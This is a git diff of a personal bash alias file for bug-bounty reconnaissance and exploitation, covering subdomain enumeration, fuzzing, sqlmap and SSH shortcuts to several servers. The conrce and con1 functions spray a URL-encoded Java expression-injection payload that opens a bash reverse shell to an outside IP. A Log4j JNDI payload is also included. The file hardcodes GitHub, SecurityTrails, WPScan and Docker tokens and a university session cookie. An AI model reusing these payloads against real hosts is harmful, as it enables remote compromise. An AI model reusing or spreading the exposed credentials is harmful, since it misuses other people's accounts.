@@ -27,7 +27,11 @@ see(){
     ls -s -S -k -h --color | vi -
 }
 resolvers(){
-    dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o resolvers.txt
+    #dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o resolvers.txt
+    cd ~/tools/tools/files/
+    rm resolvers.txt
+    wget https://raw.githubusercontent.com/proabiral/Fresh-Resolvers/master/resolvers.txt
+    cd -
 }
 tekken(){
     wine ~/test/Tekken_3.exe & exit
@@ -39,7 +43,7 @@ js(){
     grep -i -E "admin|auth|api|jenkins|corp|dev|stag|stg|prod|sandbox|swagger|aws|azure|uat|test|vpn|cms|token|credentials|user|password|key|email|" $1
 }
 g(){
-    grep -Hnir "$1" | vim -
+    grep -Hanir "$1" | vim -
 }
 srcprofile(){
 	source ~/tools/.bash_profile
@@ -110,7 +114,7 @@ nmall(){
 	sudo nmap -T4 --script=http-title -v -Pn -iL $1 -oN $2
 }
 nmp(){
-    sudo nmap -sC -sV -T4 -Pn -p$1 -v $2
+    sudo nmap -sC -sV -T4 -Pn -p $1 -v $2
 }
 mscan(){
 	sudo masscan -p0-65535 $1 --rate=200 --open
@@ -145,37 +149,17 @@ waybackall(){
 
 #-----------------------recon---------------------------------------
 recon(){
-	#recon.py on root domains
-    cat $1 | xargs -n1 -P4 -I{} recon.py {} | anew domains
-
-    #subfinder
-	cat $1 | xargs -n1 -P4 -I{} subfinder -silent -d {} | anew domains
-
-    #amass
-    cat $1 | xargs -n1 -I{} sh -c "amass enum -passive -nolocaldb -nocolor -config ~/tools/amass/config.ini -d {}" | anew domains
-
-    #clean domains
-    sanitizer.py $1 domains | sort -u > t
-    rm domains
-    mv t domains
-
-    #get third-level-domains
-    3levels.py domains > third-level-domains
-
-    #recon on third-level-domains
-    cat third-level-domains | xargs -n1 -P10 -I{} recon.py {} | anew domains
-    cat third-level-domains | xargs -n1 -P10 -I{} subfinder -silent -d {} | anew domains
-    
-    #clean domains
-    sanitizer.py $1 domains | sort -u > t
-    rm domains
-    mv t domains
+    for i in $(cat $1)
+    do
+        subdomains $i
+    done | anew domains
 }
 probe(){
     cat $1 | httpx -silent
 }
 urls(){
-    cat $1 | xargs -n1 -P4 -I{} geturls.py {} > urls
+    gauplus $1 > $1
+    cat $1
 }
 apis(){
     grep -Hnro -E 'AIza[0-9A-Za-z_-]{35}|AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}|EAACEdEose0cBA[0-9A-Za-z]+'
@@ -184,19 +168,19 @@ rlist(){
     cat $1 | xargs -n1 -P4 -I{} recon.py {}
 }
 am(){
-    cat $1 | xargs -P8 -n1 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
+    cat $1 | xargs -P4 -n1 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
 }
 param(){
-    arjun -u $1 -w ~/tools/tools/files/parameters.txt $2 $3 
+    x8 -u $1 -w ~/tools/tools/files/parameters.txt $2 $3 
 }
 fuzz(){
     ffuf -u $1 -w ~/tools/tools/files/fdict.txt -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $2 $3 $4 $5 $6 $7 $8 $9 
 }
+ff(){
+    ffuf -u $1 -w ~/tools/tools/files/dicc.txt -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $2 $3 $4 $5 $6 $7 $8 $9 
+}
 fuzzw(){
     ffuf -u $1 -w $2 -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $3 $4 $5 $6 $7 $8 $9 
-}
-jshunter(){
-    cat $1 | httpx -fl 0 -mc 200 -content-length -sr -srd scripts/ -silent -no-color -o jsindex
 }
 beautifyall(){
     ls | xargs -n1 -I{} -P4 sh -c "beautify.py {}"
@@ -219,10 +203,13 @@ findd(){
     cat $1 | xargs -n1 -I{} -P4 sh -c "findomain -q -t {}"
 }
 subdomains(){
-    amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d $1
+  #  amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d $1
     subfinder -silent -d $1
     recon.py $1
     findomain -q -t $1
+    github-subdomains -d $1 -t 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,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 -raw
+    rm $1.txt
+    stdoms $1
 }
 certspotter(){
     curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
@@ -236,11 +223,10 @@ enum(){
 
     #get data on active domains
     mkdir out
-    cat dns | httpx -status-code -content-length -title -no-color -fr -silent -location -p 443,8443,80,8080,4443,4080,8000 -td -t 100 -o out/index
+    cat dns | httpx -status-code -content-length -title -no-color -fr -silent -location -td -t 100 -o out/index
     
     #get active-domains
     cat out/index | awk '{print $1}' | sort -u > active-domains
-    
 }
 struds(){
     cat $1 | httpx -path '/sm/login/loginpagecontentgrabber.do' -threads 100 -random-agent -x GET -title -tech-detect -status-code  -follow-redirects -title -mc 200 -no-color -content-length -o $2 
@@ -255,7 +241,7 @@ sjack(){
     subjack -w $1 -t 100 -timeout 30 -c ~/tools/subjack/fingerprints.json -ssl
 }
 reconpad(){
-    ssh -i "~/tools/server/servers.pem" ubuntu@3.108.220.233
+    ssh -i "~/tools/server/servers.pem" ubuntu@20.193.131.101
 }
 checkey(){
     cat ~/bounty/maps-urls | sed "s/KEY_HERE/$1/g"
@@ -264,10 +250,10 @@ sdns(){
     shuffledns -d $1 -w $2 -r ~/tools/tools/files/resolvers.txt -strict-wildcard -silent
 }
 sendr(){
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.108.220.233:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.193.131.101:/home/ubuntu/$2
 }
 recvr(){
-    scp -i "~/tools/server/servers.pem" ubuntu@3.108.220.233:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@20.193.131.101:/home/ubuntu/$1 $2
 }
 fp(){
     find . -name $1 | xargs -n1 -I{} cat {} | sort -u
@@ -298,13 +284,13 @@ sqli(){
     python3 ~/tools/sqlmap/sqlmap.py -m $1 --dbs --batch --risk 3
 }
 fuzzer(){
-    ssh -i "~/tools/server/servers.pem" ubuntu@65.2.63.86
+    ssh -i "~/tools/server/servers.pem" ubuntu@20.197.53.241
 }
 sendf(){
-     scp -i "~/tools/server/servers.pem" $1 ubuntu@65.2.63.86:/home/ubuntu/$2
+     scp -i "~/tools/server/servers.pem" $1 ubuntu@20.197.53.241:/home/ubuntu/$2
 }
 recvf(){
-    scp -i "~/tools/server/servers.pem" ubuntu@65.2.63.86:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@20.197.53.241:/home/ubuntu/$1 $2
 }
 dork-root(){
     echo -n site:*.;join.py $1 | sed 's/,/ | site:*./g'
@@ -313,34 +299,34 @@ whm(){
     sudo python3 ~/tools/tools/whois-man.py $1 $2
 }
 sqlm(){
-    python3 ~/tools/sqlmap/sqlmap.py -u $1 --risk 2 --dbs --batch $2 $3 $4 $5
+    python3 ~/tools/sqlmap/sqlmap.py -u $1 --risk 3 --dbs --batch $2 $3 $4 $5
 }
 sqlmf(){
     python3 ~/tools/sqlmap/sqlmap.py -r $1 --risk 3 --dbs --batch $2 $3 $4 $5 $6 $7 $8 $9
 }
 bounty(){
-    ssh -i "~/tools/server/servers.pem" ubuntu@3.109.213.190
+    ssh -i "~/tools/server/servers.pem" ubuntu@45.126.126.68
 }
 sendb(){
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.109.213.190:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@45.126.126.68:/home/ubuntu/$2
 }
 recvb(){
-    scp -i "~/tools/server/servers.pem" ubuntu@3.109.213.190:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@45.126.126.68:/home/ubuntu/$1 $2
 }
 asn(){
     curl -s "http://asnlookup.com/api/lookup?org=$1" | jq -r '.[]'
 }
 scanner(){
-    ssh -i "~/tools/server/servers.pem" ubuntu@13.234.21.37
+    ssh -i "~/tools/server/servers.pem" ubuntu@20.197.55.146
 }
 sends(){
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@13.234.21.37:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.197.55.146:/home/ubuntu/$2
 }
 recvs(){
-    scp -i "~/tools/server/servers.pem" ubuntu@13.234.21.37:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@20.197.55.146:/home/ubuntu/$1 $2
 }
 hx(){
-    cat $1 | httpx -status-code -content-length -title -no-color -silent -location -td -t 100 
+    cat $1 | httpx -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0' -fr -sc -nc -title -cl -location -silent -t 100 -td $2 $3 $4 $5 $6 $7 $8 $9 
 }
 ver(){
     cd /home/rocky/recondata/verizonmedia/main/03-10-21
@@ -350,9 +336,6 @@ wps(){
 }
 sort-index(){
     cat $1 | awk '{print $NF"  "$1"  "$(NF-1)}' | tr -d '[]' | sort -u | sort -n
-}
-y(){
-    cd /home/rocky/recondata/verizonmedia/yahoo/23-10-21
 }
 roos(){
     join.py $1 | sed 's/,/|/g' | xargs -n1 -I{} sh -c "cat $2 | grep -avE '^({})$'"
@@ -367,38 +350,38 @@ wifix(){
 log4j(){
     cat $1 | grep = | qsreplace '${jndi:ldap://x${hostName}.L4J.tl6jvby071gpq088dac5st2mh.canarytokens.com/a}' | grep -vE 'www|join|invite|==' | urldedupe -s | httpx
 }
-lassan(){
-    ssh -i "~/tools/server/lassan.pem" ubuntu@3.142.160.64
+devpad(){
+    ssh -i "~/tools/server/servers.pem" ubuntu@114.29.238.23
 }
-sendl(){
-    scp -i "~/tools/server/lassan.pem" $1 ubuntu@3.142.160.64:/home/ubuntu/$2
+sendd(){
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@114.29.238.23:/home/ubuntu/$2
 }
-recvl(){
-    scp -i "~/tools/server/lassan.pem" ubuntu@3.142.160.64:/home/ubuntu/$1 $2
+recvd(){
+    scp -i "~/tools/server/servers.pem" ubuntu@114.29.238.23:/home/ubuntu/$1 $2
 }
 sendall(){
     echo 'reconpad'
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.108.220.233:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.193.131.101:/home/ubuntu/$2
     echo 'fuzzer'
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@65.2.63.86:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.197.53.241:/home/ubuntu/$2
     echo 'scanner'
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@13.234.21.37:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@20.197.55.146:/home/ubuntu/$2
     echo 'bounty'
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.109.213.190:/home/ubuntu/$2
-    echo 'uspad'
-    scp -i "~/tools/server/usservers.pem" -r $1 ubuntu@3.83.207.57:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@45.126.126.68:/home/ubuntu/$2
+    echo 'devpad'
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@114.29.238.23:/home/ubuntu/$2
 }
 sendallr(){
     echo 'reconpad'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.108.220.233:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@20.193.131.101:/home/ubuntu/$2
     echo 'fuzzer'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@65.2.63.86:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@20.197.53.241:/home/ubuntu/$2
     echo 'scanner'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@13.234.21.37:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@20.197.55.146:/home/ubuntu/$2
     echo 'bounty'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.109.213.190:/home/ubuntu/$2
-    echo 'uspad'
-    scp -i "~/tools/server/usservers.pem" -r $1 ubuntu@3.83.207.57:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@45.126.126.68:/home/ubuntu/$2
+    echo 'devpad'
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@114.29.238.23:/home/ubuntu/$2
 }
 
 c(){
@@ -427,7 +410,7 @@ uu(){
     cat $1 | grep -aE "$2" | awk '{gsub("\[", "", $4);gsub("\]", "", $4);print $4" "$0}' | uniq2.py - | sort -n 
 }
 uhp(){
-    cat $1 | awk '{gsub("\[", "", $4);gsub("\]", "", $4);print $4"    "$0}' 
+    cat $1 | awk '{gsub("\\[", "", $4);gsub("\\]", "", $4);print $4"    "$0}' 
 }
 uhp3(){
     cat $1 | awk '{gsub("\[", "", $3);gsub("\]", "", $3);print $3"  "$0}' 
@@ -446,15 +429,6 @@ grafana-tr(){
 }
 domxss(){
     grep -Hnir -E "addEventListener\((?:'|\")message(?:'|\")" | awk -F '_' '{print $1}' | httpx -sc -cl
-}
-uspad(){
-    ssh -i "~/tools/server/usservers.pem" ubuntu@3.83.207.57
-}
-sendu(){
-    scp -i "~/tools/server/usservers.pem" $1 ubuntu@3.83.207.57:/home/ubuntu/$2
-}
-recvu(){
-    scp -i "~/tools/server/usservers.pem" ubuntu@3.83.207.57:/home/ubuntu/$1 $2
 }
 n(){
     gedit ~/notes & exit
@@ -481,10 +455,10 @@ sd(){
     cat targets-data.txt | grep -aE $1 | awk -F ',' '{print $1}' | xargs -n1 -I{} sh -c "cat http-result | grep -a {}" 
 }
 conrce(){
-    cat $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/3.108.220.233/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
+    cat $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/20.193.131.101/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
 }
 con1(){
-    echo $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/3.108.220.233/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
+    echo $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/20.193.131.101/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
 }
 autowhois(){
     cat $2 | xargs -n1 -I{} sh -c "whois {} | grep -aiE $1>/dev/null && echo {};sleep 1"
@@ -517,6 +491,15 @@ ssrf(){
 vhost(){
     ffuf -u $1 -H "Host: FUZZ.$2" -t 200 -c -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0" -H "X-Forwarded-For: 127.0.0.1" -w ~/tools/tools/files/best-dns-wordlist.txt -ac -mc all
 }
+vhostall(){
+    xargs -P `nproc` -I {} sh -c 'url="{}"; ffuf -mc all -H "Host: FUZZ" -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" -u "{}/" -w ./domains -t 200 -ac -se -o fuzz/${url##*/}-${url%%:*}.json' < $1
+    cat fuzz/* | jq '[.results[]|{status: .status, length: .length, url: .url}]' | grep -oP "status\":\s(\d{3})|length\":\s(\d{1,7})|url\":\s\"(http[s]?:\/\/.*?)\"" | paste -d' ' - - - | awk '{print $2" "$4" "$6}' | sed 's/\"//g' > result.txt
+
+    cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
+    guniq 1 r | sort -n > uniq-result.txt
+    rm r
+
+}
 countd(){
     cat root | xargs -n1 -I{} sh -c "echo {};echo '';cat out/index | grep -aiE '\.{}';echo '';echo '--------------------------------------------------------------------------'"
 }
@@ -539,10 +522,17 @@ vs(){
     code . && exit
 }
 bruted(){
-    for i in $(cat $1)
-    do
-        puredns bruteforce -r ~/tools/tools/files/resolvers.txt -w $i.out ~/tools/tools/files/dns-Rocky-small.txt $i
-    done
+     mkdir output
+     for i in $(cat $1)
+     do
+     mkdir output/$i
+     for j in $(ls ~/tools/tools/files/brute/);
+     do
+            puredns bruteforce -r ~/tools/tools/files/resolvers.txt -w output/$i/$j.out ~/tools/tools/files/brute/$j $i
+     done
+     cat output/$i/* | sort -u > output/$i.dns
+     rm -rf /output/$i
+     done
 }
 perm(){
     gotator -sub $1 -perm ~/tools/dnsgen/dnsgen/words.txt -depth 2 -numbers 5 -silent
@@ -551,7 +541,7 @@ resv(){
     puredns resolve -r ~/tools/tools/files/resolvers.txt -w $1.out $1
 }
 dt(){
-    pwd | cut -d '/' -f5 | xargs -n1 -I{} sh -c "scp -i \"~/tools/server/servers.pem\" ubuntu@65.2.63.86:/home/ubuntu/{}.tar.gz . && tar -xzf {}.tar.gz"
+    pwd | cut -d '/' -f5 | xargs -n1 -I{} sh -c "scp -i \"~/tools/server/servers.pem\" ubuntu@20.197.53.241:/home/ubuntu/{}.tar.gz . && tar -xzf {}.tar.gz"
 }
 ufr(){
     cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
@@ -575,11 +565,114 @@ ghs()
 {
     for i in $(cat $1)
     do
-        github-subdomains -d $i -t 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,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 -raw
+        github-subdomains -d $i -t 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,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 -raw
     done
 }
 getresult()
 {
     paperid=$(curl -s -k -X $'POST'     -H $'Host: student.gehu.ac.in' -H $'Content-Length: 21' -H $'Accept: */*' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'     -b $'ASP.NET_SessionId=saaajgjgbucutv4a3hohqj12'     --data-binary $'yearSem=2&Regid=62018'     $'https://student.gehu.ac.in/Web_StudentAcademic/FillMarksheet' | jq .docNo | sed 's/"//g')
     echo "https://student.gehu.ac.in/Web_StudentAcademic/DownloadFile?docNo=$paperid"
+}
+gitp()
+{
+    git add .
+    git commit -m "Uploaded files"
+    git push
+}
+crepo()
+{
+    gh repo create $1  --public $2 $3 $4
+    git clone git@github.com:r0ckYr/$1.git
+}
+drepo()
+{
+    gh repo delete $1
+    rm -rf $1
+}
+dloing()
+{
+    docker login -u r0ckyr
+    #dckr_pat_VuV7ZuClkm5uIhjAhGV8CBMp6Xg
+}
+dokpush()
+{
+    sudo docker tag $1 r0ckyr/$1
+    sudo docker push r0ckyr/$1
+}
+stdoms()
+{
+    curl "https://api.securitytrails.com/v1/domain/$1/subdomains" -H 'apikey: euS5lVzNd8wKLH184k9qkFapdE1L0J46' |  jq -r .subdomains[] | sed -e s/$/.$1/g
+    #curl "https://api.securitytrails.com/v1/domain/$1/subdomains" -H 'apikey: E8YCQgYsqEPQl3xZVHaDYFWcTrlOskXl' |  jq -r .subdomains[] | sed -e s/$/.$1/g
+}
+stenum()
+{
+    stdoms $1 | tee -a $1.com | httpx -sc -cl -title -nc -td -location -fr -t 100 -o $1.out
+}
+
+hx()
+{
+    cat $1 | httpx -cl -location -fr -sc -td -silent -title -nc -t 100 -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36'
+}
+tover()
+{
+    cd ~/tools/SubOver
+    SubOver -l $1
+    cd -
+}
+vhostF()
+{
+    VhostFinder -ips $2 -wordlist $1 -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0' -t 200 | tee -a $3
+}
+lat()
+{
+    ls | rev | sort -n | rev
+}
+gettitles(){
+    cat $1 | cut -d '[' -f5 | tr -d ']$' | sort -u
+}
+cai()
+{
+    caido & exit
+}
+extract_emails()
+{
+    grep -E -osrwh "[[:alnum:]._%+-]+@[[:alnum:]]+\.[a-zA-Z]{2,6}" & grep -hnir -E -o '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'
+}
+wp()
+{
+    wpscan --url $1 --api-token a0qnZXUsMnptRAgmQip0sEbCPog0fRX0XnaHAKcuMT0wp
+}
+kcai()
+{
+    ps aux | grep caido | head -n 1 | awk '{print $2}' | xargs -I{} kill {}
+}
+sr()
+{
+    mkdir $1
+    cd $1
+    subdomains $1 | sort -u > domains
+    hx domains > index
+    cat index
+}
+dor()
+{
+    recon $1
+    enum
+}
+gob()
+{
+    go build $1.go
+    cp $1 ../bin/
+}
+gq()
+{
+    guniq 3 $1 | sort -n > uniq
+}
+atos()
+{
+    echo $1 | anew ~/tools/tools/files/secret-files
+}
+not()
+{
+    history | tail -n2 | head -n1 | sed 's/[0-9]* //' | xargs -I{} echo "Done : {}" | notify.py
 }
